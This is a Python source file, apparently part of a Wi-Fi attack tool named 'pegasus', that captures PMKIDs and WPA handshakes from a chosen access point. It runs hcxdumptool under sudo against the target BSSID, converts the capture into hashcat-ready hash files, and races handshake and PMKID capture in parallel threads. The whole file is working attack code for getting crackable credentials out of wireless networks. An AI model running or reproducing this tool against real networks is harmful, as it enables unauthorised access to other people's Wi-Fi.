import subprocess
import time
import os
import re
import threading
import signal
from pathlib import Path
from core.error_handler import ErrorHandler


PMKID_DIR = Path("/tmp/pegasus_pmkid")
HCCAPX_DIR = Path("/tmp/pegasus_hccapx")


class PmkidCapture:
    def __init__(self, config, error_handler):
        self.config = config
        self.error_handler = error_handler
        self._hcxdumptool_process = None
        self.result = None
        PMKID_DIR.mkdir(parents=True, exist_ok=True)
        HCCAPX_DIR.mkdir(parents=True, exist_ok=True)

    def is_available(self):
        try:
            r = subprocess.run(["which", "hcxdumptool"],
                               capture_output=True, text=True, timeout=3)
            if r.returncode != 0:
                return False
            r2 = subprocess.run(["which", "hcxpcaptool"],
                                capture_output=True, text=True, timeout=3)
            return r2.returncode == 0
        except Exception:
            return False

    def capture_pmkid(self, target_bssid, target_channel, interface,
                       timeout=120):
        bssid_clean = target_bssid.replace(":", "").lower()
        out_file = str(PMKID_DIR / f"pmkid_{bssid_clean}.pcapng")
        hash_file = str(HCCAPX_DIR / f"pmkid_{bssid_clean}.hc22000")

        cmd = [
            "sudo", "hcxdumptool",
            "-o", out_file,
            "-i", interface,
            "--filterlist_ap=" + target_bssid,
            "--filtermode=2",
            "-c", str(target_channel),
            "--enable_status=1",
        ]

        print(f"   Starting PMKID capture via hcxdumptool...")
        try:
            self._hcxdumptool_process = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid,
            )
        except Exception as e:
            self.error_handler.handle_error("E202", "hcxdumptool failed", e)
            return None

        start = time.time()
        last_size = 0

        while time.time() - start < timeout:
            elapsed = int(time.time() - start)

            if os.path.exists(out_file):
                size = os.path.getsize(out_file)
                if size > last_size:
                    print(f"   PMKID capture: {size} bytes ({elapsed}s)", end="\r")
                    last_size = size

                if size > 500:
                    pmkid = self._extract_pmkid(out_file, hash_file)
                    if pmkid:
                        print(f"\n   PMKID captured!")
                        self._cleanup_process()
                        return hash_file

            if elapsed > 0 and elapsed % 15 == 0:
                print(f"   PMKID waiting... ({elapsed}s / {timeout}s)", end="\r")

            time.sleep(2)

        print(f"\n   PMKID timeout ({timeout}s)")
        self._cleanup_process()

        if os.path.exists(out_file) and os.path.getsize(out_file) > 500:
            pmkid = self._extract_pmkid(out_file, hash_file)
            if pmkid:
                return hash_file

        return None

    def _extract_pmkid(self, pcapng_file, output_hash):
        try:
            cmd = [
                "hcxpcaptool",
                "-z", output_hash,
                pcapng_file,
            ]
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

            if os.path.exists(output_hash) and os.path.getsize(output_hash) > 50:
                with open(output_hash) as f:
                    for line in f:
                        if "*" in line and len(line) > 100:
                            return output_hash

            if "PMKID" in r.stdout or "pmkid" in r.stdout.lower():
                if os.path.exists(output_hash) and os.path.getsize(output_hash) > 50:
                    return output_hash

            return None
        except Exception:
            return None

    def _cleanup_process(self):
        if self._hcxdumptool_process:
            try:
                os.killpg(os.getpgid(self._hcxdumptool_process.pid), signal.SIGTERM)
            except Exception:
                self._hcxdumptool_process.terminate()
            try:
                self._hcxdumptool_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._hcxdumptool_process.kill()
            self._hcxdumptool_process = None

    def cleanup(self):
        self._cleanup_process()
        for d in [PMKID_DIR, HCCAPX_DIR]:
            for f in d.iterdir():
                try:
                    f.unlink()
                except OSError:
                    pass


class AsyncCaptureEngine:
    def __init__(self, config, error_handler, handshake_capture, pmkid_capture):
        self.config = config
        self.error_handler = error_handler
        self.handshake_capture = handshake_capture
        self.pmkid_capture = pmkid_capture
        self._stop_event = threading.Event()
        self.result = {"type": None, "file": None, "method": None}

    def capture_dual(self, target_bssid, target_channel, interface,
                      timeout=180):
        self._stop_event.clear()
        self.result = {"type": None, "file": None, "method": None}

        threads = []
        lock = threading.Lock()

        def _handshake_worker():
            print(f"   [Thread 1] Handshake capture started")
            hs_file = self.handshake_capture.capture_handshake(
                target_bssid, target_channel, interface, timeout=timeout,
            )
            with lock:
                if hs_file and not self._stop_event.is_set():
                    self.result = {
                        "type": "handshake",
                        "file": hs_file,
                        "method": "handshake_capture",
                    }
                    self._stop_event.set()

        def _pmkid_worker():
            print(f"   [Thread 2] PMKID capture started")
            pm_file = self.pmkid_capture.capture_pmkid(
                target_bssid, target_channel, interface, timeout=timeout,
            )
            with lock:
                if pm_file and not self._stop_event.is_set():
                    self.result = {
                        "type": "pmkid",
                        "file": pm_file,
                        "method": "pmkid_attack",
                    }
                    self._stop_event.set()

        t1 = threading.Thread(target=_handshake_worker, daemon=True)
        t2 = threading.Thread(target=_pmkid_worker, daemon=True)

        t1.start()
        time.sleep(2)
        t2.start()

        start = time.time()
        while time.time() - start < timeout:
            if self._stop_event.is_set():
                break
            time.sleep(1)

        self._stop_event.set()

        if self.result["file"]:
            return self.result

        return None
